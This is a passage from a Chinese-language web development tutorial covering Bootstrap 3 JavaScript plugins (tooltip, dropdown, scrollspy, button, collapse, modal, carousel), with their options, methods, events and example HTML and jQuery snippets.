</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#nav a'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">     e.preventDefault();</span><br><span class="line">     $(<span class="keyword">this</span>).tab(<span class="string">'show'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>Tab</code> 插件中的事件：
<ul>
<li><code>show.bs.tab</code>      在调用 <code>tab</code> 方法时触发</li>
<li><code>shown.bs.tab</code>     在显示整个标签时触发</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#nav a'</span>).on(<span class="string">'show.bs.tab'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     alert(<span class="string">'调用 tab 时触发！'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><strong>工具提示</strong></p>
<ul>
<li>工具提示就是通过鼠标移动选定在特定的元素上时，显示相关的提示语</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//基本实例</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">data-toggle</span>=<span class="string">"tooltip"</span> <span class="attr">title</span>=<span class="string">"超文本标识符"</span>&gt;</span>HTML5<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>JavaScript</code> 初始化 <code>$('#section').tooltip();</code></p>
</li>
<li>
<p><code>data-animation</code>   默认 <code>true</code>，在 <code>tooltip</code> 上应用一个 <code>CSS fade</code> 动画。 如果设置 <code>false</code>，则不应用。</p>
</li>
<li>
<p><code>data-html</code>       默认 <code>false</code>，不允许提示内容格式为 <code>html</code>。如果设置 为 <code>true</code>，则可以设置 <code>html</code> 格式的提示内容。</p>
</li>
<li>
<p><code>data-placement</code>   默认值 <code>top</code>，还有 <code>bottom</code>、<code>left</code>、<code>right</code> 和 <code>auto</code>。 如果<code>auto</code>会自行调整合适的位置，如果是<code>auto</code> <code>left</code> 则会尽量在左边显示，但左边不行就靠右边。</p>
</li>
<li>
<p><code>data-selector</code>    默认 <code>false</code>，可以选择绑定指定的选择器。 <code>rel=&quot;tooltip&quot;</code></p>
</li>
<li>
<p><code>data-original-title</code> 默认空字符串，提示语的内容。优先级比 title 低</p>
</li>
<li>
<p><code>title</code>           默认字空符串，提示语的内容。</p>
</li>
<li>
<p><code>data-trigger</code>     默认值 <code>hover</code> <code>foucs</code>，表示怎么触发 <code>tooltip</code>，其 他值为：<code>click</code>、<code>manual</code>。多个值用空格隔开，<code>manual</code> 手动不能和其他同时设置。</p>
</li>
<li>
<p><code>data-delay</code>       默认值 <code>0</code>，延迟触发 <code>tooltip(毫秒)</code>，如果传数字则， 表示 <code>show</code>/<code>hide</code> 的毫秒数，如果传对象，结构为：<code>{ show:500,hide:100 }</code></p>
</li>
<li>
<p><code>data-containe</code>r   默认值 <code>false</code>，将<code>tooltip</code> 附加到特定的元素上。比 如组合按钮组提示，容器不够，可以附加 <code>body</code> 上。<code>container : 'body'</code></p>
</li>
<li>
<p><code>data-template</code>    更改提示框的 <code>HTML</code> 提示语的模版，默认值为：</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'tooltip'</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'tooltip-arrow'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'tooltip-inner'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">rel</span>=<span class="string">"tooltip"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">data-toggle</span>=<span class="string">"tooltip"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">title</span>=<span class="string">"超文本标识符"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">data-animation</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">data-html</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">data-placement</span>=<span class="string">"auto"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">data-selector</span>=<span class="string">"a[rel=tooltip]"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">data-trigger</span>=<span class="string">"click"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">data-delay</span>=<span class="string">"500"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">data-template</span>=<span class="string">"&lt;b&gt;123&lt;/b&gt;"</span> &gt;</span>HTML5</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#selector a'</span>).tooltip(&#123;</span><br><span class="line">	delay : &#123;</span><br><span class="line">		show : <span class="number">500</span>,</span><br><span class="line">		hide : <span class="number">100</span>,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>Tooltip</code>插件中的方法：</p>
<ul>
<li>显示   <code>$('#section a').tooltip('show');</code></li>
<li>隐藏              <code>$('#section a').tooltip('hide');</code></li>
<li>反转显示和隐藏    <code>$('#section a').tooltip('toggle');</code></li>
<li>隐藏并销毁        <code>$('#section a').tooltip('destroy');</code></li>
</ul>
</li>
<li>
<p><code>Tooltip</code>插件中的事件：</p>
<ul>
<li><code>show.bs.tooltip</code>  在 <code>show</code> 方法调用时立即触发</li>
<li><code>shown.bs.tooltip</code> 在提示框完全显示给用户之后触发</li>
<li><code>hide.bs.tooltip</code>  在 <code>hide</code> 方法调用时立即触发</li>
<li><code>hidden.bs.tooltip</code> 在提示框完全隐藏之后触发</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#select a'</span>).on(<span class="string">'show.bs.tooltip'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     alert(<span class="string">'调用 show 时触发！'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//data-selector</span></span><br><span class="line">$(<span class="string">"#selector"</span>).tooltip(&#123;</span><br><span class="line">     selector:<span class="string">"a[rel='tooltip']"</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>data-container</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">title</span>=<span class="string">"超文本标记符"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">title</span>=<span class="string">"超文本标记符"</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">title</span>=<span class="string">"超文本标记符"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"button"</span>).tooltip(&#123;</span><br><span class="line">    delay:&#123;</span><br><span class="line">        show:<span class="number">500</span>,</span><br><span class="line">        hide:<span class="number">100</span></span><br><span class="line">    &#125;,</span><br><span class="line">    container:<span class="string">"body"</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="十一-下拉菜单-滚动监听-按钮和折叠插件"><a class="markdownIt-Anchor" href="#十一-下拉菜单-滚动监听-按钮和折叠插件"></a> 十一、下拉菜单、滚动监听、按钮和折叠插件</h4>
<hr />
<p><strong>下拉菜单插件</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"dropdown"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span>&gt;</span> 下拉菜单 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>产品<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果按钮在容器外部，可以通过 <code>data-target</code> 进行绑定</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"btn"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span> <span class="attr">data-target</span>=<span class="string">"#dropdown"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>Dropdown</code>插件的方法：，但仍然需要 <code>data-*</code></p>
<ul>
<li><code>$('#btn').dropdown();</code></li>
<li><code>$('#btn').dropdown('toggle');</code></li>
</ul>
</li>
<li>
<p><code>Dropdown</code>插件的事件：</p>
<ul>
<li><code>show.bs.dropdown</code>    在 <code>show</code> 方法调用时立即触发。</li>
<li><code>shown.bs.dropdown</code>   在下拉菜单完全显示出来，并且等 <code>CSS</code> 动画完成之后 触发。</li>
<li><code>hide.bs.dropdown</code>     在 <code>hide</code> 方法调用时，但还未关闭隐藏时触发。</li>
<li><code>hidden.bs.dropdown</code>   在下拉菜单完全隐藏之后，并且等 <code>CSS</code> 动画完成之后 触发。</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#dropdown'</span>).on(<span class="string">'show.bs.dropdown'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     alert(<span class="string">'在调用 show 方法时立即触发！'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><strong>滚动监听插件</strong></p>
<ul>
<li>
<p><code>data-offset</code>  默认值为 <code>10</code>，固定弄内容距滚动容器 <code>10</code> 像素以内， 就高亮显示所对应的菜单</p>
</li>
<li>
<p><code>data-spy</code>    设置 <code>scroll</code>，将设置滚动容器监听</p>
</li>
<li>
<p><code>data-target</code>  设置<code>#nav</code>，绑定指定监听的菜单</p>
</li>
<li>
<p><code>scroll</code>插件的方法：</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"#scroll"</span>).scrollspy(&#123;</span><br><span class="line">     <span class="comment">//offset: 0,</span></span><br><span class="line">     target: <span class="string">"#nav"</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>activate.bs.scrollspy</code>    每当一个新条目被激活后都将由滚动监听插件触 发此事件。</li>
<li>事件绑定在导航上</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#nav'</span>).on(<span class="string">'activate.bs.scrollspy'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     alert(<span class="string">'新条目被激活后触发此事件！'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>滚动监听还有一个更新容器 <code>DOM</code> 的方法
<ul>
<li><code>refresh</code>  更新容器 <code>DOM</code> 的方法</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeSec</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    $(e).parents(<span class="string">'.sec'</span>).remove();</span><br><span class="line">    $(<span class="string">'#content'</span>).scrollspy(<span class="string">'refresh'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>按钮插件</strong></p>
<ul>
<li>单个切换</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">data-toggle</span>=<span class="string">"button"</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span>&gt;</span>单个切换<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>注：在 <code>Firefox</code> 多次页面加载时，按钮可能保持表单的禁用或选择状态。解决方案是： 添加<code>autocomplete=&quot;off&quot;。</code></p>
</li>
<li>
<p>单选按钮</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span> <span class="attr">data-toggle</span>=<span class="string">"buttons"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-primary active"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span> <span class="attr">checked</span>&gt;</span> 男</span><br><span class="line">   <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span>&gt;</span> 女</span><br><span class="line">   <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>复选按钮</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn-group"</span> <span class="attr">data-toggle</span>=<span class="string">"buttons"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-primary active"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"fa"</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span> <span class="attr">checked</span>&gt;</span> 音乐</span><br><span class="line">   <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"fa"</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span>&gt;</span> 体育</span><br><span class="line">   <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"fa"</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span>&gt;</span> 美术</span><br><span class="line">   <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"fa"</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span>&gt;</span> 电脑</span><br><span class="line">   <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>加载状态</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"myButton"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">data-loading-text</span>=<span class="string">"Loading..."</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span>&gt;</span> 加载状态 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#myButton'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> btn = $(<span class="keyword">this</span>).button(<span class="string">'loading'</span>);</span><br><span class="line">     setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         btn.button(<span class="string">'reset'</span>);</span><br><span class="line">     &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>Button</code> 插件中的 <code>button</code> 方法中有三个参数：<code>toggle</code>、<code>reset</code>、<code>string</code>(比如 <code>loading</code>、 <code>complete</code>)。</li>
<li>可代替    <code>data-toggle=&quot;button&quot;</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'button'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     $(<span class="keyword">this</span>).button(<span class="string">'toggle'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><strong>折叠插件</strong></p>
<ul>
<li>基本实例</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">"#content"</span>&gt;</span> Bootstrap <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collapse"</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"well"</span>&gt;</span></span><br><span class="line">         Bootstrap 是 Twitter 推出的一个用于前端开发的开源工具包。它由 Twitter 的设计师 Mark Otto 和 Jacob Thornton 合作开发,是一个 CSS/HTML 框架。目 前,Bootstrap 最新版本为 3.0 。</span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>Collapse</code>插件的方法：<code>hide</code>、<code>show</code>、<code>toggle</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'button'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     $(<span class="string">'#collapseOne'</span>).collapse(<span class="string">'toggle'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>Collapse</code>插件的事件：
<ul>
<li><code>show.bs.collapse</code>     在 <code>show</code> 方法调用时立即触发</li>
<li><code>shown.bs.collapse</code>   折叠区完全显示出来是触发</li>
<li><code>hide.bs.collapse</code>    在 <code>hide</code> 方法调用时触发</li>
<li><code>hidden.bs.collapse</code>   该事件在折叠区域完全隐藏之后触发</li>
</ul>
</li>
</ul>
<h4 id="十二-模态框-轮播插件"><a class="markdownIt-Anchor" href="#十二-模态框-轮播插件"></a> 十二、模态框、轮播插件</h4>
<hr />
<p><strong>模态框插件</strong></p>
<ul>
<li>模态框的弹窗组件需要三层 <code>div</code> 容器元素，分别为 <code>modal</code>(模态声明层)、 <code>dialog</code>(窗口声明层)、<code>content</code>(内容层)</li>
<li>在内容层里面，还有三层，分别为 <code>header</code>(头部)、<code>body</code>(主体)、<code>footer</code>(注脚)</li>
<li>模态框去掉 <code>show</code>，增加一个 <code>id</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal"</span> <span class="attr">id</span>=<span class="string">"myModal"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 点击触发模态框显示 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-lg"</span> <span class="attr">data-toggle</span>=<span class="string">"modal"</span> <span class="attr">data-target</span>=<span class="string">"#myModal"</span>&gt;</span> 点击弹窗 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 弹窗的大小有三种，默认情况下是正常，还有 lg(大)和 sm(小) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog modal-lg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog sm-lg"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 可设置淡入淡出效果 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"myModal"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>所有的插件，都是基于 <code>JavaScript</code>/<code>jQuery</code> 的。</p>
</li>
<li>
<p>四个要素：用法、参数、方法和事件。</p>
</li>
<li>
<p><strong>用法</strong></p>
<ul>
<li>可以通过 <code>data</code> 属性 <code>data-toggle</code>  <code>data-toggle=&quot;modal&quot;</code>  <code>data-target=&quot;#myModal&quot;</code></li>
<li><code>data-toggle</code> 表示触发类型</li>
<li><code>data-target</code> 表示触发的节点</li>
<li>如果不是使用<code>&lt;button&gt;</code>，而是<code>&lt;a&gt;</code>，其中 <code>data-target</code> 也可以使用 <code>href=&quot;#myModal&quot;</code>取代</li>
<li>建议使用 <code>data-target</code>。除了 <code>data-toggle</code> 和 <code>data-target</code> 两个声明 属性外，还有一些可以用选项</li>
</ul>
</li>
<li>
<p><strong>参数</strong></p>
<ul>
<li><code>data-backdrop</code>    布尔值或 <code>'static'</code>   默认值 <code>true</code>，表示背景存在黑灰透明 遮罩，且单击空白背景可关闭弹窗；</li>
<li>如果为 <code>false</code>，表示背景不存在黑灰 透明遮罩，且点击空白背景不可关闭 弹窗；</li>
<li>如果是字符串<code>'static'</code>，表示背景存 在黑灰透明遮罩，且点击空白不可关 闭弹窗。</li>
<li><code>data-keyboard</code>   布尔值 <code>true</code>   如果是 <code>true</code>，按 <code>esc</code> 键会关闭窗口； 如果是 <code>false</code>，按 <code>esc</code> 键会不会关闭。</li>
<li><code>data-show</code>   布尔值 <code>true</code>   如果是 <code>true</code>，初始化时，默认显示； 如果是 <code>false</code>，初始化时，默认隐藏。</li>
<li><code>remote</code>   <code>url</code> 路径 空值   如果值不是以<code>#</code>号开头，则表示一个 <code>url</code> 地址，加载 <code>url</code> 内容到 <code>modal-content</code> 容器里，并只加载一 次。</li>
<li>如果是<code>#</code>号，就是取代 <code>data-target</code> 的方法。</li>
<li>在 <code>JavaScript</code> 直接设置</li>
<li>通过 <code>jQuery</code> 方式声明</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#myModal'</span>).modal(&#123;</span><br><span class="line">     show : <span class="literal">true</span>,</span><br><span class="line">     backdrop : <span class="literal">false</span>,</span><br><span class="line">     keyboard : <span class="literal">false</span>,</span><br><span class="line">     remote : <span class="string">'index.html'</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>方法</strong>
<ul>
<li><code>toggle .modal('toggle')</code>; 触发时，反转切换弹窗状态</li>
<li><code>show .modal('show')</code>; 触发时，显示弹窗</li>
<li><code>hide .modal('hide')</code>; 触发时，关闭弹窗</li>
<li>点击显示弹窗</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#btn'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	$(<span class="string">'#myModal'</span>).modal(<span class="string">'show'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">'#myModal'</span>).modal(&#123;</span><br><span class="line">	   show : <span class="literal">false</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><strong>事件</strong></p>
<ul>
<li><code>show.bs.modal</code>    在<code>show</code> 方法调用时立即触发。</li>
<li><code>shown.bs.modal</code>  在模态框完全显示出来，并且等 <code>CSS</code> 动画完成之后触 发。</li>
<li><code>hide.bs.modal</code>    在 <code>hide</code> 方法调用时，但还未关闭隐藏时触发。</li>
<li><code>hidden.bs.modal</code>  在模态框完全隐藏之后，并且等 <code>CSS</code> 动画完成之后触 发</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#myModal'</span>).on(<span class="string">'show.bs.modal'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	alert(<span class="string">'在 show 方法调用时立即触发！'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">'#myModal'</span>).on(<span class="string">'loaded.bs.modal'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	alert(<span class="string">'远程数据加载完毕后触发！'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><strong>轮播图插件</strong></p>
<ul>
<li><code>data</code> 属性解释：
<ul>
<li><code>data-slide</code> 接受关键字 <code>prev</code> 或 <code>next</code>，用来改变幻灯片相对于当前位置的位置；</li>
<li><code>data-slide-to</code> 来向轮播底部创建一个原始滑动索引，<code>data-slide-to=&quot;2&quot;</code>将把滑 动块移动到一个特定的索引，索引从 0 开始计数。</li>
<li><code>data-ride=&quot;carousel&quot;</code>属性用户标记轮播在页面加载时开始动画播放。</li>
<li><code>data-interval</code>   默认值 <code>5000</code>，幻灯片的等待时间(毫秒)。如果为 <code>false</code>，轮播将不会自动开始循环。</li>
<li><code>data-pause</code>       默认鼠标停留在幻灯片区域(<code>hover</code>)即暂停轮播，鼠 标离开即启动轮播。</li>
<li><code>data-wrap</code>        默认值 <code>true</code>，轮播是否持续循环。</li>
<li>如果在 <code>JavaScript</code> 调用就直接使用键值对方法，并去掉 <code>data-</code>；</li>
</ul>
</li>
</ul>
